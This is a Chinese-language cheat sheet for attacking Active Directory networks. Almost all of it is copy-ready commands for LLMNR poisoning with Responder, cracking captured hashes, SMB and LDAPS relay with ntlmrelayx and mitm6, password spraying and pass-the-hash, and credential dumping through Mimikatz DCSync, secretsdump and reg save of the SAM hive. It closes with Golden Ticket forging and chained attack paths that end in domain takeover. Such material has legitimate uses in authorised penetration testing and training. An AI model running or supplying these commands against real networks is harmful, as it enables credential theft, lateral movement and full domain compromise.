# AD 滲透工具速查表

> 涵蓋工具：Responder · hashcat · ntlmrelayx · crackmapexec · SharpHound · Mimikatz DCSync · GetNPUsers · mitm6 · secretsdump · nmap smb2-security-mode

---

## 1. Responder

**使用場景**：LLMNR / NBT-NS / mDNS 毒化，捕獲網路上的 NTLMv2 Challenge-Response Hash。

| 參數 | 說明 |
|------|------|
| `-I <iface>` | 監聽的網卡，例如 `eth0` |
| `-d` | 啟用 DHCP 回應（DHCPv6 毒化） |
| `-w` | 啟用 WPAD rogue proxy |
| `-v` | 詳細輸出，顯示每筆捕獲 |
| `-A` | 分析模式（只監聽不回應，隱蔽偵察用） |

```bash
# 標準毒化
sudo responder -I eth0 -dwv

# 分析模式（偵察，不回應）
sudo responder -I eth0 -A

# 捕獲結果位置
ls /usr/share/responder/logs/
```

---

## 2. hashcat

**使用場景**：離線暴力破解各類 hash，搭配 Responder / Kerberoast / AS-REP Roast / PTH 使用。

| Mode | Hash 類型 | 攻擊場景 |
|------|-----------|---------|
| `1000` | NTLM | 本機 SAM / NTDS.dit dump |
| `5600` | NetNTLMv2 | Responder 捕獲的 hash |
| `13100` | Kerberos TGS-REP | Kerberoasting |
| `18200` | Kerberos AS-REP | AS-REP Roasting |

```bash
# 破解 NTLMv2（Responder 捕獲）
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 破解 Kerberoast TGS
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# 破解 AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 破解本機 NTLM hash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# 加規則增強破解率
hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 顯示已破解結果
hashcat -m 5600 hashes.txt --show
```

---

## 3. ntlmrelayx

**使用場景**：SMB Relay 攻擊，將捕獲的 NTLM 認證 relay 到目標主機取得 shell 或 hash dump。

| 參數 | 說明 |
|------|------|
| `-tf <file>` | 目標主機清單（一行一 IP） |
| `-smb2support` | 支援 SMBv2 目標 |
| `--no-http` | 停用內建 HTTP server，避免與 Responder 衝突 |
| `-i` | 開啟互動式 SMB shell |
| `-e <file>` | Relay 成功後執行指定可執行檔 |
| `-c <cmd>` | Relay 成功後執行指令 |
| `-6` | IPv6 模式（搭配 mitm6） |
| `-t ldaps://` | Relay 到 LDAPS（搭配 mitm6 建立委派） |
| `--delegate-access` | 建立機器帳號並設委派（用於 mitm6 攻擊鏈） |

```bash
# 基本 SMB Relay
ntlmrelayx.py -tf targets.txt -smb2support

# 取得互動式 shell
ntlmrelayx.py -tf targets.txt -smb2support -i

# Relay 後執行指令
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# 搭配 mitm6 relay 到 LDAPS
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh attacker-wpad --delegate-access
```

> **前提**：目標 SMB Signing = disabled，且被 relay 的帳號對目標有本機管理員權限。

---

## 4. crackmapexec (CME)

**使用場景**：大範圍橫向移動、PTH、密碼噴灑、服務枚舉。

| 參數 | 說明 |
|------|------|
| `smb <range>` | 目標網段 |
| `-u <user>` | 使用者名稱 |
| `-p <pass>` | 明文密碼 |
| `-H <hash>` | NTLM hash（PTH，只需 NT 部分） |
| `--local-auth` | 使用本機帳號認證（非域帳號） |
| `-x <cmd>` | 執行 cmd 指令 |
| `-X <cmd>` | 執行 PowerShell 指令 |
| `--sam` | dump SAM 資料庫 |
| `--shares` | 列出共享資料夾 |
| `--sessions` | 列出已登入 sessions |
| `--loggedon-users` | 列出已登入使用者 |

```bash
# 密碼噴灑（找有效帳號）
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Pass-the-Hash 橫向移動
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> --local-auth

# PTH + 執行指令
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> -x "whoami"

# dump SAM
crackmapexec smb 10.0.0.1 -u admin -p pass --sam

# 列出所有共享
crackmapexec smb 192.168.1.0/24 -u user -p pass --shares
```

---

## 5. SharpHound

**使用場景**：在 Windows 機器上收集 AD 資訊，產生 BloodHound 可匯入的 zip 檔案，視覺化攻擊路徑。

| 參數 | 說明 |
|------|------|
| `-c All` | 收集所有資訊（Session、ACL、ObjectProps 等） |
| `-c DCOnly` | 只收集 DC 資訊（較安靜） |
| `--zipfilename` | 指定輸出 zip 檔名 |
| `--domain` | 指定目標域 |
| `--ldapusername / --ldappassword` | 明確指定 LDAP 認證 |
| `--stealth` | 隱蔽模式（只查詢 DC，不掃描每台機器） |

```bash
# 完整收集
SharpHound.exe -c All --zipfilename bloodhound_data.zip

# 隱蔽模式
SharpHound.exe -c DCOnly --stealth

# 指定域
SharpHound.exe -c All --domain corp.local

# Linux 版（需要 Python + impacket）
bloodhound-python -u user -p pass -d domain.local -dc dc01 -c All
```

**BloodHound 核心查詢**：
- `Shortest Paths to Domain Admins` — 從目前帳號到 DA 最短路徑
- `Find AS-REP Roastable Users` — 無需預認證帳號
- `Find Kerberoastable Users` — 有 SPN 的服務帳號
- `Find Principals with DCSync Rights` — 有 DCSync 權限帳號

---

## 6. Mimikatz — DCSync

**使用場景**：模擬 DC 複製行為，從域控傾印任意帳號的 NTLM hash（包含 KRBTGT），不需要直接登入 DC。

| 指令 | 說明 |
|------|------|
| `lsadump::dcsync /user:<user>` | 傾印指定帳號 hash |
| `lsadump::dcsync /all /csv` | 傾印所有帳號（輸出 CSV） |
| `lsadump::lsa /patch` | 從本機 LSA 傾印 hash（需 SYSTEM） |
| `sekurlsa::logonpasswords` | 從記憶體取明文密碼 / hash |
| `kerberos::golden` | 建立 Golden Ticket |
| `kerberos::ptt <ticket>` | Pass-the-Ticket，注入 .kirbi |

```bash
# DCSync 傾印 KRBTGT（Golden Ticket 所需）
lsadump::dcsync /domain:domain.local /user:krbtgt

# DCSync 傾印 Domain Admin
lsadump::dcsync /domain:domain.local /user:Administrator

# 傾印所有帳號
lsadump::dcsync /domain:domain.local /all /csv

# 從記憶體取 hash（需 SYSTEM）
privilege::debug
sekurlsa::logonpasswords

# 建立 Golden Ticket 並注入
kerberos::golden /user:hacker /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:<HASH> /ptt
```

> **權限需求**：DCSync 需要 `DS-Replication-Get-Changes` 及 `DS-Replication-Get-Changes-All` 權限（DA 預設擁有）。

---

## 7. GetNPUsers（AS-REP Roasting）

**使用場景**：找出關閉 Kerberos 預先認證的帳號，取得可離線破解的 AS-REP hash。

| 參數 | 說明 |
|------|------|
| `domain/` | 域名（無需密碼） |
| `-usersfile` | 使用者清單 |
| `-no-pass` | 不需要密碼（利用無預認證漏洞） |
| `-dc-ip` | DC IP 位址 |
| `-format hashcat` | 輸出 hashcat 相容格式（預設） |
| `-outputfile` | 儲存 hash 到檔案 |

```bash
# 基本 AS-REP Roast（有使用者清單）
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# 有帳號密碼時自動枚舉（不需清單）
GetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# 輸出到檔案
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -outputfile asrep.txt

# 破解
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## 8. mitm6

**使用場景**：利用 Windows 優先使用 IPv6 的行為，偽造 DHCPv6 / DNS 伺服器，搭配 ntlmrelayx 攻擊鏈。

| 參數 | 說明 |
|------|------|
| `-d <domain>` | 目標域名（過濾 DNS 回應對象） |
| `-i <iface>` | 指定網卡 |
| `--ignore-nofqdn` | 忽略非完整域名的 DNS 請求 |

```bash
# 基本啟動
mitm6 -d domain.local

# 完整攻擊鏈（mitm6 + ntlmrelayx）
# Terminal 1：
mitm6 -d domain.local

# Terminal 2：
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh attacker-wpad --delegate-access

# 攻擊鏈說明：
# 1. mitm6 成為 IPv6 DNS 伺服器
# 2. 受害者查詢 WPAD → 向攻擊者發出 NTLM 認證
# 3. ntlmrelayx relay 到 LDAPS → 建立機器帳號 + 設委派
# 4. 後續用 getST.py 取得 TGS 存取 DC
```

---

## 9. secretsdump

**使用場景**：遠端或本機傾印 SAM、LSA Secrets、NTDS.dit，是 post-compromise 取得 hash 的核心工具。

| 參數 | 說明 |
|------|------|
| `domain/user:pass@IP` | 使用明文密碼認證 |
| `-hashes :NTLM` | 使用 NTLM hash 認證（PTH） |
| `-just-dc-ntlm` | 只傾印 NTLM hash（速度更快） |
| `-just-dc-user <user>` | 只傾印指定帳號 |
| `-outputfile` | 輸出到檔案 |
| `LOCAL` | 本機模式（需提供 SAM / SYSTEM 路徑） |

```bash
# 遠端傾印（需 DA 或 DCSync 權限）
secretsdump.py domain/admin:pass@DC_IP

# PTH 方式
secretsdump.py -hashes :NTLM_HASH domain/admin@DC_IP

# 只取 NTLM hash（最快）
secretsdump.py domain/admin:pass@DC_IP -just-dc-ntlm

# 本機模式（已取得 SAM / SYSTEM hive）
secretsdump.py LOCAL -sam SAM -system SYSTEM

# 傾印後結果格式
# domain\username:RID:LM_HASH:NTLM_HASH:::
```

> **取得 SAM / SYSTEM hive（本機）**：
> ```bash
> reg save HKLM\SAM sam.hive
> reg save HKLM\SYSTEM system.hive
> ```

---

## 10. nmap — smb2-security-mode

**使用場景**：掃描網段確認哪些主機 SMB Signing 未強制，找出可被 SMB Relay 攻擊的目標。

| 腳本 | 用途 |
|------|------|
| `smb2-security-mode` | 顯示 SMB2 signing 設定狀態 |
| `smb-vuln-ms17-010` | 偵測 EternalBlue 漏洞 |
| `smb-enum-shares` | 列舉共享資料夾 |
| `smb-enum-users` | 列舉 SMB 使用者 |

```bash
# 掃描 SMB Signing 狀態（Relay 前置偵察）
nmap -p 445 --script smb2-security-mode 192.168.1.0/24

# 過濾出未強制 signing 的主機
nmap -p 445 --script smb2-security-mode 192.168.1.0/24 | grep -B5 "not required"

# 輸出到 targets.txt 供 ntlmrelayx 使用
nmap -p 445 --script smb2-security-mode 192.168.1.0/24 -oG - \
  | grep "Message signing enabled but not required" \
  | awk '{print $2}' > targets.txt

# 快速存活掃描 + 版本
nmap -p 445 -sV --open 192.168.1.0/24
```

**結果判讀**：
- `Message signing enabled and required` → 無法 Relay
- `Message signing enabled but not required` → **可被 SMB Relay 攻擊**
- `Message signing disabled` → **可被 SMB Relay 攻擊**

---

## 攻擊鏈速查

### 1：LLMNR → NTLMv2 破解
```
Responder 毒化 → 捕獲 NTLMv2 hash → hashcat -m 5600 破解 → CME 橫向移動
```

### 2：SMB Relay → Shell
```
nmap 找無 Signing 主機 → Responder 停用 SMB/HTTP → ntlmrelayx relay → 取得 shell
```

### 3：Kerberoasting
```
GetUserSPNs.py 取 TGS → hashcat -m 13100 破解 → 用服務帳號密碼橫向移動
```

### 4：AS-REP Roasting
```
GetNPUsers.py 找無預認證帳號 → 取 AS-REP hash → hashcat -m 18200 破解
```

### 5：DCSync → Golden Ticket
```
取得 DA/DCSync 權限 → secretsdump / Mimikatz DCSync 取 KRBTGT hash → kerberos::golden 偽造 TGT → 任意存取
```

### 6：mitm6 → LDAPS Relay → 委派
```
mitm6 偽造 DHCPv6 → ntlmrelayx relay LDAPS → 建立機器帳號 + 委派 → getST.py 取 TGS → pass-the-ticket
```